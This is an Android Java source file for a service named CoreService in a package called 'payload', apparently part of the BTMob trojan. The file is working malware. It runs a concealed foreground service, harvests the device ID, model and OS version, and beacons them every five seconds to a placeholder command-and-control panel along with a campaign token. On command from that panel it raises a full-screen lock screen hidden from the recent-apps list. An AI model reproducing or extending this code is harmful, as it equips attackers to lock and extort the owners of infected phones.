package com.btmob.payload;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CoreService extends Service {
    private static final String TAG = "BTMob";
    private static final String PANEL_URL = "https://SEU-PAINEL.com/api";
    private static final String CAMPAIGN_TOKEN = "CAMPAIGN_TOKEN_PLACEHOLDER";
    private static final long CHECK_INTERVAL = 5;

    private ScheduledExecutorService scheduler;
    private String deviceId;
    private Handler mainHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceId == null || deviceId.isEmpty()) {
            deviceId = Build.SERIAL;
        }
        startForegroundService();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (scheduler == null || scheduler.isShutdown()) {
            scheduler = Executors.newSingleThreadScheduledExecutor();
            scheduler.scheduleAtFixedRate(this::checkIn, 0, CHECK_INTERVAL, TimeUnit.SECONDS);
        }
        return START_STICKY;
    }

    private void startForegroundService() {
        String channelId = "btmob_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId, "BT Mob Service", NotificationManager.IMPORTANCE_MIN);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

        Notification notification = new Notification.Builder(this, channelId)
            .setContentTitle("Sistema")
            .setContentText("Serviço em execução")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build();

        startForeground(1, notification);
    }

    private void checkIn() {
        try {
            URL url = new URL(PANEL_URL + "/check-in");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("campaign_token", CAMPAIGN_TOKEN);
            payload.put("device_model", Build.MODEL);
            payload.put("android_version", Build.VERSION.RELEASE);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes("UTF-8"));
            os.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                JSONObject responseJson = new JSONObject(response.toString());
                boolean screenLocked = responseJson.optBoolean("screen_locked", false);
                String lockType = responseJson.optString("lock_type", "update");
                String command = responseJson.optString("command", "idle");

                if (screenLocked && "lock".equals(command)) {
                    mainHandler.post(() -> showLockScreen(lockType));
                } else if (!screenLocked) {
                    mainHandler.post(this::hideLockScreen);
                }
            }
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Check-in error: " + e.getMessage());
        }
    }

    private void showLockScreen(String type) {
        Intent intent = new Intent(this, LockScreenActivity.class);
        intent.putExtra("lock_type", type);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private void hideLockScreen() {
        Intent intent = new Intent("com.btmob.payload.UNLOCK");
        sendBroadcast(intent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
        super.onDestroy();
    }
}